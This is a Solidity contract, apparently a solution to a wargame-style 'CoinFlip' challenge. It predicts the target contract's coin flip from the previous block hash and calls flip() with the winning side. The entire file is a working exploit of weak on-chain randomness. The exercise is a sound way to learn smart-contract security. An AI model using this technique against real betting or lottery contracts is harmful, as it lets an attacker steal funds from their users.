// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";
import "hardhat/console.sol";

contract AttackingCoinFlip {
    address public contractAddress;
    uint256 private lastHash;
    CoinFlip public coinflip;
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
        coinflip = CoinFlip(contractAddress);
    }

    function hackContract() external {
        // Code me!
        uint256 blockValue = uint256(blockhash(block.number - 1));
        console.log("blockvalue: %s", blockValue);

        if (lastHash == blockValue) {
            revert("SAME_BLOCK");
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinflip.flip(side);
    }
}
